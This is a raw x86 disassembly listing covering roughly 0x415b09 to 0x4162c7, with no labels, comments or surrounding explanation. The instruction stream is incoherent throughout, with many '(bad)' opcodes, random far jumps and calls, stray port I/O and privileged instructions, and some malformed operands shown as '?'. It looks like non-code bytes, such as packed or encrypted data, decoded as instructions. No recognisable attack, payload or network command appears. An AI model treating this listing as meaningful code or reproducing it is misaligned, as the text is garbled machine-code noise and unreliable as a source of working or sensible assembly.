  415b09:	loopne 0x415b1b
  415b0b:	cmp    DWORD PTR [edi],edx
  415b0d:	or     eax,ebx
  415b0f:	add    DWORD PTR [eax+0xe],esi
  415b12:	sub    bl,BYTE PTR [eax]
  415b14:	jnp    0x415b1d
  415b16:	add    esi,edi
  415b18:	xchg   BYTE PTR [ecx],dl
  415b1a:	adc    al,ah
  415b1c:	pop    esi
  415b1d:	jp     0x415ae5
  415b1f:	iret   
  415b20:	mov    al,ds:0x3d158e16
  415b25:	cmp    ecx,esi
  415b27:	mov    eax,ds:0xe029e8fe
  415b2c:	sub    ecx,DWORD PTR [ebp+0x68356771]
  415b32:	adc    edi,edi
  415b34:	sbb    cl,BYTE PTR [ebx]
  415b36:	mov    ebx,0xac844838
  415b3b:	and    eax,0x95c17cd9
  415b40:	in     al,dx
  415b41:	in     al,dx
  415b42:	pop    ds
  415b43:	jb     0x415b3c
  415b45:	das    
  415b46:	mov    bl,0xd
  415b48:	xchg   BYTE PTR [eax-0x6e],bl
  415b4b:	push   0xfffffff7
  415b4d:	outs   dx,DWORD PTR ds:[esi]
  415b4e:	mov    ds:0xfd7fc214,al
  415b53:	mov    bl,0xba
  415b55:	mov    al,0x97
  415b57:	push   ebp
  415b58:	cmp    ecx,DWORD PTR [ebx+0x7d]
  415b5b:	data16 test BYTE PTR [eax-0x3c2ca],ch
  415b62:	jae    0x415b0b
  415b64:	sub    BYTE PTR [ebp-0x6],bh
  415b67:	inc    ecx
  415b68:	daa    
  415b69:	mov    ebx,0xaede3165
  415b6e:	add    al,0xfb
  415b70:	mov    al,BYTE PTR [ebx-0x64]
  415b73:	cli    
  415b74:	(bad)  
  415b75:	out    dx,eax
  415b76:	ins    BYTE PTR es:[edi],dx
  415b77:	mov    esp,0x19cfed74
  415b7c:	test   BYTE PTR [ecx+0x71],0x5
  415b80:	fisttp DWORD PTR [esi-0xe]
  415b83:	push   ebp
  415b84:	mov    ds:0x4fe46db4,al
  415b89:	add    DWORD PTR [eax-0x78],esp
  415b8c:	adc    bh,bl
  415b8e:	and    al,0xe4
  415b90:	jae    0x415b82
  415b92:	ret    0xf5da
  415b95:	sub    DWORD PTR [ebp+0x2329483f],esp
  415b9b:	adc    esi,DWORD PTR [ebp-0x6128d883]
  415ba1:	xor    DWORD PTR [esi],0xffffffbb
  415ba4:	ins    BYTE PTR es:[edi],dx
  415ba5:	call   FWORD PTR [ebx-0x28961937]
  415bab:	mov    bl,0xd3
  415bad:	jmp    0xf0b1:0x21bec9c7
  415bb4:	leave  
  415bb5:	scas   eax,DWORD PTR es:[edi]
  415bb6:	mov    edx,esi
  415bb8:	push   ds
  415bb9:	arpl   WORD PTR [eax-0x60],si
  415bbc:	je     0x415b9d
  415bbe:	pop    esp
  415bbf:	loope  0x415bc9
  415bc1:	sbb    edx,esi
  415bc3:	xchg   ebp,eax
  415bc4:	sub    eax,0xe82a2d4e
  415bc9:	inc    ax
  415bcb:	or     ecx,DWORD PTR [edx-0x2f]
  415bce:	sub    ch,BYTE PTR [ebx+ebp*2]
  415bd1:	push   0x493a4515
  415bd6:	mov    bh,0x45
  415bd8:	mov    edx,0x26448099
  415bdd:	std    
  415bde:	add    ebx,DWORD PTR [ecx-0x70a9c2e0]
  415be4:	aam    0xd6
  415be6:	ds adc al,0xee
  415be9:	sbb    BYTE PTR [edx],al
  415beb:	jge    0x415bb0
  415bed:	mov    ds:0x910696a9,al
  415bf2:	mov    ch,0x46
  415bf4:	stc    
  415bf5:	inc    ebx
  415bf6:	into   
  415bf7:	cmp    BYTE PTR [esi],cl
  415bf9:	cld    
  415bfa:	icebp  
  415bfb:	cmp    cl,BYTE PTR [ebp+eiz*8+0x501e2572]
  415c02:	pushf  
  415c03:	jb     0x415c59
  415c05:	dec    ebp
  415c06:	xor    esp,DWORD PTR [edi-0x3cf1af24]
  415c0c:	mov    esp,0x981034ea
  415c11:	dec    esp
  415c12:	mov    dl,0x86
  415c14:	in     eax,dx
  415c15:	pushf  
  415c16:	call   0x245b:0x8d3d973c
  415c1d:	les    ecx,FWORD PTR [edi+0x5eb241c9]
  415c23:	clc    
  415c24:	cmp    eax,0x34cb56fd
  415c29:	mov    edi,0xf731ba69
  415c2e:	mov    BYTE PTR [di],bh
  415c31:	add    BYTE PTR [edi+0x54],0x9e
  415c35:	push   0xffffffa0
  415c37:	pop    ecx
  415c38:	pop    edx
  415c39:	mov    dl,0x44
  415c3b:	mov    esp,0xba17146e
  415c40:	loope  0x415bdc
  415c42:	fst    DWORD PTR [edx]
  415c44:	sbb    eax,0xe8a70ce5
  415c49:	add    eax,0xd6adfaf5
  415c4e:	int3   
  415c4f:	and    DWORD PTR [ebp+0x10],edi
  415c52:	jae    0x415c70
  415c54:	call   0xa18ef408
  415c59:	outs   dx,DWORD PTR ds:[esi]
  415c5a:	paddusb mm6,QWORD PTR [edi+0x52faebb1]
  415c61:	xor    DWORD PTR [edx+ecx*8],0x3d
  415c65:	push   ecx
  415c66:	les    ebx,FWORD PTR [edi+eiz*1]
  415c69:	js     0x415ce4
  415c6b:	or     ebp,ecx
  415c6d:	ja     0x415cd8
  415c6f:	sub    DWORD PTR ds:0xc22e962b,0x7c9be0db
  415c79:	aad    0x9c
  415c7b:	(bad)  
  415c7c:	iret   
  415c7d:	jnp    0x415c37
  415c7f:	mov    esi,0x78f75833
  415c84:	mov    ecx,0x7903f7d2
  415c89:	pop    ecx
  415c8a:	shr    ch,cl
  415c8c:	pop    ecx
  415c8d:	out    dx,eax
  415c8e:	in     al,0x1f
  415c90:	repz adc BYTE PTR [edi+ebp*8],cl
  415c94:	(bad)  
  415c95:	ins    BYTE PTR es:[edi],dx
  415c96:	data16 adc al,0x60
  415c99:	ja     0x415c8e
  415c9b:	dec    ecx
  415c9c:	daa    
  415c9d:	dec    ecx
  415c9e:	mov    cl,0xbf
  415ca0:	xchg   edi,eax
  415ca1:	lds    esi,FWORD PTR [eax-0x6f317d97]
  415ca7:	cs jge 0x415c77
  415caa:	inc    eax
  415cab:	push   esi
  415cac:	add    eax,0x2457744a
  415cb1:	outs   dx,DWORD PTR ds:[esi]
  415cb2:	cmp    edx,ebx
  415cb4:	das    
  415cb5:	sub    BYTE PTR [ebp+0x50560796],bh
  415cbb:	in     eax,dx
  415cbc:	xchg   esi,eax
  415cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbe:	push   ecx
  415cbf:	mov    edx,0x83c7417f
  415cc4:	ret    0x828f
  415cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc8:	pop    edi
  415cc9:	stos   DWORD PTR es:[edi],eax
  415cca:	out    0x61,eax
  415ccc:	ss jmp 0x837e:0x6f0c625
  415cd4:	add    ah,BYTE PTR cs:[ecx+0x9]
  415cd8:	mov    ds:0xde7cf62,eax
  415cdd:	test   BYTE PTR ds:0xae25924d,dh
  415ce3:	sahf   
  415ce4:	bound  eax,QWORD PTR [eax-0x796231fa]
  415cea:	in     eax,0x1
  415cec:	mov    BYTE PTR [eax-0x21],al
  415cef:	sbb    BYTE PTR [ebp-0x25],cl
  415cf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cf3:	cli    
  415cf4:	jmp    0x57169a34
  415cf9:	outs   dx,BYTE PTR ds:[esi]
  415cfa:	inc    eax
  415cfb:	lahf   
  415cfc:	repnz (bad) 
  415cff:	imul   esi,DWORD PTR ds:0x18ff7df3,0x7e
  415d06:	dec    edi
  415d07:	and    ah,BYTE PTR [esi]
  415d09:	iret   
  415d0a:	sub    ebp,DWORD PTR [edi+0x573fe78]
  415d10:	aam    0x32
  415d12:	add    eax,0xca8113d0
  415d17:	and    al,0xad
  415d19:	nop
  415d1a:	jb     0x415cdb
  415d1c:	dec    esi
  415d1d:	sub    DWORD PTR [esi],0xffffffac
  415d20:	and    bh,BYTE PTR [eax+edi*1+0x46]
  415d24:	sbb    BYTE PTR [edx+0x4499409f],ch
  415d2a:	aam    0x45
  415d2c:	hlt    
  415d2d:	mov    eax,0x71322b2c
  415d32:	mov    bl,0x22
  415d34:	pusha  
  415d35:	pop    esi
  415d36:	inc    edx
  415d37:	inc    eax
  415d38:	cmp    ah,BYTE PTR [eax+0x54]
  415d3b:	or     eax,0xb8f2805f
  415d40:	pop    esi
  415d41:	push   0x73
  415d43:	shl    DWORD PTR [ebx],1
  415d45:	bound  ebx,QWORD PTR [ebp+0x37]
  415d48:	sbb    DWORD PTR [ecx+0x76],edx
  415d4b:	es mov esi,0x6da0b34e
  415d51:	add    DWORD PTR ds:0xba59158e,ecx
  415d57:	int    0xfa
  415d59:	ret    
  415d5a:	(bad)  
  415d5b:	int3   
  415d5c:	int3   
  415d5d:	mov    eax,ds:0x393b5fe5
  415d62:	and    al,0x82
  415d64:	sub    DWORD PTR [ecx],esp
  415d66:	add    BYTE PTR [edi+0x25],dh
  415d69:	sub    al,0x17
  415d6b:	repnz mov cl,0xa4
  415d6e:	in     eax,dx
  415d6f:	and    ebx,eax
  415d71:	fs mov bl,0x96
  415d74:	sub    eax,0x6f486bf5
  415d79:	cmp    eax,0xc37878cb
  415d7e:	out    dx,al
  415d7f:	push   ss
  415d80:	ins    DWORD PTR es:[edi],dx
  415d81:	scas   eax,DWORD PTR es:[edi]
  415d82:	in     al,0x97
  415d84:	aaa    
  415d85:	fwait
  415d86:	mov    ebx,0x884a7c70
  415d8b:	adc    DWORD PTR [edx+0x7],edi
  415d8e:	sbb    eax,0x26f17763
  415d93:	aad    0x5e
  415d95:	xor    DWORD PTR [edi-0x427777f2],eax
  415d9b:	fwait
  415d9c:	xchg   ebp,eax
  415d9d:	inc    ecx
  415d9e:	lods   al,BYTE PTR ds:[esi]
  415d9f:	scas   eax,DWORD PTR es:[edi]
  415da0:	add    DWORD PTR [eax+0x5ac4f55d],edi
  415da6:	repz xchg esp,eax
  415da8:	pop    eax
  415da9:	cs gs push cs
  415dac:	mov    al,ds:0x7c872f8d
  415db1:	mov    WORD PTR [edx+0x40],fs
  415db4:	cmc    
  415db5:	gs aam 0x33
  415db8:	lods   eax,DWORD PTR ds:[esi]
  415db9:	push   es
  415dba:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  415dbc:	dec    ebx
  415dbd:	cld    
  415dbe:	push   cs
  415dbf:	jecxz  0x415dd9
  415dc1:	cld    
  415dc2:	mov    ah,0xc
  415dc4:	add    eax,DWORD PTR [eax+0x7304771b]
  415dca:	cwde   
  415dcb:	and    BYTE PTR [edx],0x47
  415dce:	test   eax,0xf971b4f4
  415dd3:	repnz popf 
  415dd5:	popf   
  415dd6:	cld    
  415dd7:	dec    ch
  415dd9:	std    
  415dda:	add    ch,bh
  415ddc:	push   ecx
  415ddd:	xchg   edx,eax
  415dde:	aam    0x11
  415de0:	cmp    edi,eax
  415de2:	push   ebp
  415de3:	aam    0x8a
  415de5:	dec    edi
  415de6:	jae    0x415d8a
  415de8:	sbb    ch,bl
  415dea:	bound  edi,QWORD PTR [edx-0x2767a4c0]
  415df0:	push   ss
  415df1:	pop    es
  415df2:	sub    al,0xee
  415df4:	adc    BYTE PTR [eax],0x14
  415df7:	into   
  415df8:	dec    esp
  415df9:	sbb    esp,edi
  415dfb:	ror    ecx,0xc
  415dfe:	pop    es
  415dff:	xchg   ebp,eax
  415e00:	pop    ds
  415e01:	sub    ch,0xec
  415e04:	mov    ds:0x9ecf4882,al
  415e09:	lods   eax,DWORD PTR ds:[esi]
  415e0a:	in     eax,0xc3
  415e0c:	sub    al,0x8f
  415e0e:	xor    DWORD PTR [esi],ebp
  415e10:	cdq    
  415e11:	ret    
  415e12:	fs or  al,0x11
  415e15:	dec    edi
  415e16:	xor    DWORD PTR [ecx-0x7da262cf],ecx
  415e1c:	mov    bl,0x9a
  415e1e:	xchg   ebp,ecx
  415e20:	idiv   BYTE PTR [ebx-0x59]
  415e23:	mov    dh,0x3a
  415e25:	pop    ecx
  415e26:	stos   DWORD PTR es:[edi],eax
  415e27:	sar    DWORD PTR [edi],1
  415e29:	mov    al,ds:0x25914a7c
  415e2e:	cmp    edx,edx
  415e30:	gs aaa 
  415e32:	jmp    0x3523:0xd675cab6
  415e39:	gs das 
  415e3b:	push   ecx
  415e3c:	jae    0x415e40
  415e3e:	nop
  415e3f:	push   edi
  415e40:	push   ds
  415e41:	adc    BYTE PTR [ebx],bh
  415e43:	hlt    
  415e44:	mov    cs,esi
  415e46:	lock aad 0xd4
  415e49:	ficomp DWORD PTR ds:0x12959e91
  415e4f:	cmp    DWORD PTR [ebp-0x28],eax
  415e52:	lock aad 0xb
  415e55:	lock pop edi
  415e57:	test   al,0x63
  415e59:	(bad)  
  415e5a:	int    0xa8
  415e5c:	out    dx,eax
  415e5d:	sar    BYTE PTR [edx],0x10
  415e60:	out    dx,al
  415e61:	push   ecx
  415e62:	(bad)  
  415e63:	fcomp  QWORD PTR [esi]
  415e65:	dec    ebp
  415e66:	in     al,dx
  415e67:	aam    0x2b
  415e69:	adc    DWORD PTR [edi],eax
  415e6b:	pop    edx
  415e6c:	jns    0x415e53
  415e6e:	mov    ds:0xa88da12f,al
  415e73:	loope  0x415eab
  415e75:	pop    DWORD PTR [edx]
  415e77:	mov    ecx,0xdc357a1b
  415e7c:	call   0xcd48:0xd3ed7a4
  415e83:	fistp  WORD PTR [ecx]
  415e85:	sbb    DWORD PTR ds:0x68bcb0f7,eax
  415e8b:	sbb    esp,eax
  415e8d:	xor    eax,0x6f3b9d29
  415e92:	leave  
  415e93:	jnp    0x415eb9
  415e95:	repz cmp eax,esp
  415e98:	fidivr WORD PTR [ecx+0x11]
  415e9b:	pop    esi
  415e9c:	iret   
  415e9d:	inc    esi
  415e9f:	aas    
  415ea0:	dec    edi
  415ea1:	sbb    esp,DWORD PTR [ebp+0x7]
  415ea4:	inc    edi
  415ea5:	jo     0x415e4c
  415ea7:	leave  
  415ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ea9:	sbb    al,0x24
  415eab:	push   esp
  415eac:	push   ds
  415ead:	add    al,0xf5
  415eaf:	ret    0x1b20
  415eb2:	stos   DWORD PTR es:[edi],eax
  415eb3:	out    dx,eax
  415eb4:	fs lock jp 0x415efb
  415eb8:	fnstcw WORD PTR [esi-0x4f0fec6]
  415ebe:	and    ch,BYTE PTR [edi-0x7f]
  415ec1:	xchg   BYTE PTR [esi+0x6432bdd],ch
  415ec7:	xor    eax,0xf854c6
  415ecc:	cli    
  415ecd:	ret    
  415ece:	enter  0xc323,0xd5
  415ed2:	into   
  415ed3:	jg     0x415e6a
  415ed5:	das    
  415ed6:	jne    0x415eaa
  415ed8:	cmp    al,0x95
  415eda:	in     eax,0x6b
  415edc:	jb     0x415f14
  415ede:	jmp    0x11:0xff860eb5
  415ee5:	or     bh,BYTE PTR [edx+0x5f6f2e46]
  415eeb:	sbb    al,0x5e
  415eed:	dec    edi
  415eee:	push   ecx
  415eef:	dec    ebx
  415ef0:	and    esi,DWORD PTR [ebp-0x273feb90]
  415ef6:	or     eax,0x5a155290
  415efb:	and    eax,eax
  415efd:	pop    eax
  415efe:	(bad)  
  415eff:	jl     0x415f4a
  415f01:	out    0x63,al
  415f03:	xchg   ebp,eax
  415f04:	mov    dl,al
  415f06:	jecxz  0x415ec2
  415f08:	mov    esi,0x5d73ae75
  415f0d:	sahf   
  415f0e:	jp     0x415f2a
  415f10:	clc    
  415f11:	adc    al,0x13
  415f13:	jge    0x415eb5
  415f15:	mov    eax,ds:0x85318f92
  415f1a:	dec    edi
  415f1b:	cmp    BYTE PTR [esi-0x25eeff97],dl
  415f21:	int3   
  415f22:	jmp    esp
  415f24:	aas    
  415f25:	sbb    ch,BYTE PTR [edi+0x32a3ee6d]
  415f2b:	pandn  mm1,QWORD PTR [edx+0x7ce7f78a]
  415f32:	xchg   edi,eax
  415f33:	out    0x53,al
  415f35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f36:	xor    esi,DWORD PTR [edi-0x7e]
  415f39:	in     eax,dx
  415f3a:	fldcw  WORD PTR [ecx-0x14]
  415f3d:	(bad)  
  415f3e:	loopne 0x415f22
  415f40:	dec    edi
  415f41:	ret    
  415f42:	jge    0x415fab
  415f44:	stc    
  415f45:	inc    ecx
  415f46:	fld    QWORD PTR [edx+0x6fdaa0b9]
  415f4c:	cmp    ebp,DWORD PTR [edx+0x65973bc4]
  415f52:	adc    ecx,DWORD PTR [ecx+ecx*2+0x78]
  415f56:	fadd   DWORD PTR [ecx-0x61]
  415f59:	adc    eax,0x4a389715
  415f5e:	lahf   
  415f5f:	mov    esp,0x8847929a
  415f64:	lds    eax,FWORD PTR ds:0x894756a8
  415f6a:	sbb    DWORD PTR [ecx-0x41f70fda],edi
  415f70:	out    dx,al
  415f71:	cmp    ecx,esp
  415f73:	xchg   edx,eax
  415f74:	push   cs
  415f75:	int3   
  415f76:	xchg   esp,eax
  415f77:	leave  
  415f78:	lds    ecx,FWORD PTR [eax+0x695326dc]
  415f7e:	das    
  415f7f:	fs pop ds
  415f81:	leave  
  415f82:	inc    eax
  415f83:	frstor [edi+0x35]
  415f86:	sbb    BYTE PTR [ecx-0x40a17b74],0x22
  415f8d:	add    DWORD PTR [edx-0x44],0xffffffe8
  415f91:	hlt    
  415f92:	fldcw  WORD PTR [edx-0x65]
  415f95:	mov    ds:0xcb32d997,eax
  415f9a:	call   0xeb9dc374
  415f9f:	pushf  
  415fa0:	rol    DWORD PTR [ebx],0x77
  415fa3:	popf   
  415fa4:	imul   edx,DWORD PTR [ebx],0xe
  415fa7:	(bad)  
  415fa8:	jp     0x41601b
  415faa:	int    0x7b
  415fac:	fldpi  
  415fae:	add    DWORD PTR [edi-0x72],edx
  415fb1:	jb     0x415f65
  415fb3:	in     eax,0xae
  415fb5:	cdq    
  415fb6:	je     0x415f42
  415fb8:	push   ecx
  415fb9:	add    cl,BYTE PTR [eax+0x3b]
  415fbc:	in     al,0x7
  415fbe:	push   ss
  415fbf:	inc    esi
  415fc0:	inc    ebp
  415fc1:	inc    ecx
  415fc2:	mov    esp,0xab60fc5a
  415fc7:	hlt    
  415fc8:	jl     0x415faf
  415fca:	outs   dx,DWORD PTR ds:[esi]
  415fcb:	sub    al,0x2c
  415fcd:	mov    ebp,0x4f53792
  415fd2:	jns    0x415f8e
  415fd4:	shl    DWORD PTR [ecx],cl
  415fd6:	push   edi
  415fd7:	xlat   BYTE PTR ds:[ebx]
  415fd8:	adc    DWORD PTR [esi],esi
  415fda:	adc    DWORD PTR [ecx+0x62c22167],edi
  415fe0:	or     ebx,DWORD PTR [eax-0x7ac553b0]
  415fe6:	ret    0xf62a
  415fe9:	lock call 0xd1e994fb
  415fef:	popa   
  415ff0:	(bad)  
  415ff1:	addr16 (bad) 
  415ff4:	sbb    eax,0x890ab656
  415ff9:	mov    esi,0x261e786a
  415ffe:	cwde   
  415fff:	add    eax,ecx
  416001:	pop    ss
  416002:	sahf   
  416003:	dec    edi
  416004:	jno    0x415fa3
  416006:	ret    0xb37
  416009:	cmp    al,0x5a
  41600b:	addr16 nop
  41600d:	test   DWORD PTR [edi-0x7d658c9c],ebx
  416013:	cmp    BYTE PTR [esi+0x6e],bl
  416016:	xchg   BYTE PTR [ebp+0x4e],bl
  416019:	add    eax,0x7843426e
  41601e:	retf   
  41601f:	xor    al,0x74
  416021:	mov    edx,0x93723a38
  416026:	mov    edx,0x1579ca2d
  41602b:	aad    0x71
  41602d:	stos   DWORD PTR es:[edi],eax
  41602e:	sbb    WORD PTR [edx-0x35db65bd],dx
  416035:	mov    ds:0x3c910765,eax
  41603a:	inc    edx
  41603b:	leave  
  41603c:	pop    ds
  41603d:	mov    al,ds:0x12726c83
  416042:	sub    BYTE PTR [ecx],0xc8
  416045:	outs   dx,DWORD PTR ds:[esi]
  416046:	or     ah,BYTE PTR [esi+0x43]
  416049:	iret   
  41604a:	mov    esp,0x7901429a
  41604f:	mov    BYTE PTR [ebx*1+0x1bfdd99e],cl
  416056:	xchg   ecx,eax
  416057:	jge    0x4160a3
  416059:	pop    eax
  41605a:	shr    DWORD PTR [ecx+0x4dd63218],1
  416060:	dec    ebx
  416061:	push   ebp
  416062:	inc    eax
  416063:	in     al,0x7a
  416065:	retf   0xb773
  416068:	sub    esi,DWORD PTR [esi+0x54]
  41606b:	je     0x41607b
  41606d:	xor    DWORD PTR [edx+0x345cc275],edi
  416073:	fld    DWORD PTR [ebp+0x55b6d3a9]
  416079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41607a:	fdivr  DWORD PTR [edx+ebx*1-0x72]
  41607e:	adc    bl,BYTE PTR [edx+0x4a2767a6]
  416084:	jp     0x416096
  416086:	loop   0x416089
  416088:	pusha  
  416089:	stc    
  41608a:	das    
  41608b:	jne    0x41602e
  41608d:	jno    0x4160ed
  41608f:	enter  0x18da,0xc1
  416093:	mov    bl,0xd2
  416095:	ds retf 
  416097:	dec    ebp
  416098:	add    ebp,ebp
  41609a:	inc    eax
  41609b:	pusha  
  41609c:	loop   0x4160fe
  41609e:	or     al,0x7c
  4160a0:	and    ch,BYTE PTR [ecx+0x6b]
  4160a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a4:	jge    0x416098
  4160a6:	mov    ebx,0xcceeca97
  4160ab:	add    ecx,DWORD PTR [edi+esi*1]
  4160ae:	idiv   bh
  4160b0:	loop   0x4160ca
  4160b2:	jb     0x416132
  4160b4:	inc    edx
  4160b5:	xlat   BYTE PTR ds:[ebx]
  4160b6:	dec    esi
  4160b7:	test   eax,0x60e43ccc
  4160bc:	out    0x58,al
  4160be:	and    esp,DWORD PTR [esi+ecx*1+0x39fdb584]
  4160c5:	push   edi
  4160c6:	mov    esi,0xe098b7a5
  4160cb:	sbb    BYTE PTR [edi+eax*1+0x48],ah
  4160cf:	arpl   cx,di
  4160d1:	jle    0x41607b
  4160d3:	mov    esi,0x2d111e84
  4160d8:	and    esi,DWORD PTR [edx-0x45]
  4160db:	sub    DWORD PTR [ebx],ecx
  4160dd:	(bad)  
  4160de:	stc    
  4160df:	les    ecx,FWORD PTR [edx+0x7]
  4160e2:	rcl    BYTE PTR [ebx+0x2a9c6a9f],cl
  4160e8:	sbb    al,0x19
  4160ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160eb:	add    esp,esp
  4160ed:	std    
  4160ee:	ret    
  4160ef:	inc    edx
  4160f0:	mov    ch,0x40
  4160f2:	fild   WORD PTR [edx-0x2d]
  4160f5:	dec    edx
  4160f6:	dec    ecx
  4160f7:	xchg   BYTE PTR [edi],ah
  4160f9:	mov    dh,0xd0
  4160fb:	sub    BYTE PTR [ecx-0x32],0x1
  4160ff:	jmp    0x75777984
  416104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416105:	xchg   ebp,eax
  416106:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416107:	inc    eax
  416108:	je     0x416118
  41610a:	outs   dx,DWORD PTR ds:[esi]
  41610b:	loope  0x4160fb
  41610d:	mov    dh,0x59
  41610f:	fxch   st(6)
  416111:	adc    al,0x39
  416113:	aaa    
  416114:	push   esp
  416115:	neg    DWORD PTR [ecx+0x5a]
  416118:	loopne 0x416113
  41611a:	fisttp WORD PTR [esi]
  41611c:	cwde   
  41611d:	iret   
  41611e:	fwait
  41611f:	push   cs
  416120:	dec    eax
  416121:	sub    BYTE PTR [ebx],dh
  416123:	push   ecx
  416124:	push   es
  416125:	lods   eax,DWORD PTR ds:[esi]
  416126:	(bad)  
  416127:	cli    
  416128:	sub    bl,BYTE PTR [edx]
  41612a:	loopne 0x416133
  41612c:	cmp    BYTE PTR [eax-0x38],al
  41612f:	(bad)
  416133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416134:	inc    ebp
  416135:	push   edx
  416136:	jo     0x41618c
  416138:	xor    al,0xfd
  41613a:	dec    edi
  41613b:	mov    bh,0x96
  41613d:	xlat   BYTE PTR ds:[ebx]
  41613e:	retf   0x9aa4
  416141:	mov    ebx,0xf7a22307
  416146:	ins    DWORD PTR es:[edi],dx
  416147:	loope  0x4160d8
  416149:	jbe    0x4161b0
  41614b:	arpl   WORD PTR [ebx-0x3385f028],bp
  416151:	xlat   BYTE PTR ds:[ebx]
  416152:	in     eax,0x91
  416154:	mov    ds:0x4ff41bfd,eax
  416159:	call   0x56d5507c
  41615e:	mov    edx,0x727d9a61
  416163:	inc    edi
  416164:	jb     0x41618d
  416166:	push   cs
  416167:	jl     0x416147
  416169:	aad    0x92
  41616b:	test   BYTE PTR [edx+0x16ef05b3],0x25
  416172:	or     BYTE PTR [esp+edi*4-0x4d],bl
  416176:	add    BYTE PTR [eax+0x0],dh
  416179:	and    DWORD PTR [esi+0x2c],ecx
  41617c:	scas   al,BYTE PTR es:[edi]
  41617d:	lahf   
  41617e:	dec    ebp
  41617f:	jbe    0x41616e
  416181:	out    dx,al
  416182:	enter  0x86a,0x2d
  416186:	std    
  416187:	push   edi
  416188:	dec    ebp
  416189:	adc    al,0xf5
  41618b:	wrmsr  
  41618d:	mov    BYTE PTR [edx-0x32b87c78],dl
  416193:	test   al,0xa4
  416195:	ja     0x41617f
  416197:	lahf   
  416198:	out    dx,al
  416199:	data16 rol cl,1
  41619c:	adc    al,0x87
  41619e:	jmp    0x27b7:0x5dc86a40
  4161a5:	sub    BYTE PTR ds:0x33e3a277,ah
  4161ab:	push   es
  4161ac:	jne    0x416192
  4161ae:	and    edi,DWORD PTR [ecx]
  4161b0:	xchg   BYTE PTR [edx],ah
  4161b2:	push   ebx
  4161b3:	dec    ecx
  4161b4:	sbb    bh,BYTE PTR [edi]
  4161b6:	inc    eax
  4161b7:	inc    edi
  4161b8:	je     0x41622a
  4161ba:	pushf  
  4161bb:	shr    DWORD PTR [esi-0x44],cl
  4161be:	(bad)  
  4161bf:	xchg   edi,eax
  4161c0:	loope  0x4161d7
  4161c2:	jl     0x4161a2
  4161c4:	pop    ebp
  4161c5:	sbb    BYTE PTR [esi],al
  4161c7:	sbb    eax,0x389829dd
  4161cc:	cs jb  0x416225
  4161cf:	bound  ebp,QWORD PTR [edi]
  4161d1:	es or  eax,0xeb82b9e2
  4161d7:	dec    edi
  4161d8:	es mov cl,0x35
  4161db:	push   es
  4161dc:	retf   0x2dad
  4161df:	mov    eax,ds:0xe9d9341
  4161e4:	loop   0x41625a
  4161e6:	je     0x4161e8
  4161e8:	sbb    DWORD PTR [edx],0x34
  4161eb:	lea    ebp,[esi+0x56]
  4161ee:	or     ch,cl
  4161f0:	mov    ecx,0xf49c57c
  4161f5:	add    BYTE PTR [edi],dl
  4161f7:	das    
  4161f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161f9:	out    dx,al
  4161fa:	out    0xc2,eax
  4161fc:	ss and eax,0x8a43d09
  416202:	cmp    eax,0xfacb2a48
  416207:	call   0xd6748ba4
  41620c:	lahf   
  41620d:	imul   ecx,ecx,0x7
  416210:	into   
  416211:	ret    
  416212:	inc    edi
  416213:	push   cs
  416214:	push   eax
  416215:	mov    ds:0x603476c8,al
  41621a:	cmp    BYTE PTR [eax-0x1c],0xb9
  41621e:	out    dx,al
  41621f:	sbb    BYTE PTR [eax+0x7db185c0],bh
  416225:	xor    esi,DWORD PTR [ebp+eiz*1-0x4e]
  416229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41622a:	add    eax,0x7d3a10b1
  41622f:	adc    eax,0x1441c5c5
  416234:	cmp    ebp,DWORD PTR [esi]
  416236:	data16 adc al,0x40
  416239:	not    ch
  41623b:	sbb    DWORD PTR [ebp+ebp*8+0x27],edi
  41623f:	mov    ?,WORD PTR [edi+0x1be1ef4f]
  416245:	cmp    DWORD PTR [ecx],edx
  416247:	adc    al,0xbf
  416249:	imul   eax,edx,0x39
  41624c:	mov    BYTE PTR [eax+0x4c933248],0x58
  416253:	bnd je 0x4162b6
  416256:	xor    al,0x5a
  416258:	mov    DWORD PTR [esi+0x61],esi
  41625b:	jmp    0x4162c5
  41625d:	mov    WORD PTR [ecx],?
  41625f:	xor    cl,ah
  416261:	sbb    ah,BYTE PTR [edx-0x4b0d9891]
  416267:	jge    0x416216
  416269:	mov    edx,0xbab90bdc
  41626e:	add    BYTE PTR [ebx+0x27],0x38
  416272:	sub    ebp,edx
  416274:	sub    ecx,DWORD PTR [edi+0x4a]
  416277:	lea    esi,[esp+eiz*4]
  41627a:	pop    ebp
  41627b:	xor    edx,DWORD PTR [ebx+0x1]
  41627e:	retf   
  41627f:	push   0x17
  416281:	mov    dh,0x52
  416283:	arpl   WORD PTR [ebx-0x1de2498a],bx
  416289:	pop    ecx
  41628a:	mov    ebp,DWORD PTR [ecx+ecx*4]
  41628d:	push   eax
  41628e:	aas    
  41628f:	dec    esp
  416290:	add    bh,ch
  416292:	mov    edx,DWORD PTR [ecx]
  416294:	cmp    dl,BYTE PTR [edi-0x73f3a46b]
  41629a:	ss cmp ch,dl
  41629d:	dec    edi
  41629e:	idiv   BYTE PTR [edi-0x6]
  4162a1:	cmp    dh,0x14
  4162a4:	loop   0x4162bb
  4162a6:	es pop ss
  4162a8:	and    ebp,DWORD PTR [eax-0xf9c4f7e]
  4162ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162af:	adc    eax,DWORD PTR [esp+edx*1]
  4162b2:	mov    bh,dh
  4162b4:	adc    DWORD PTR [esi],edx
  4162b6:	xor    ebp,DWORD PTR [esi]
  4162b8:	dec    ecx
  4162b9:	sbb    al,0xb6
  4162bb:	or     eax,0x133ac2ce
  4162c0:	xor    BYTE PTR [edi+0x68],al
  4162c3:	push   esi
  4162c4:	jo     0x4162de
  4162c6:	leave  
  4162c7:	jns    0x416297
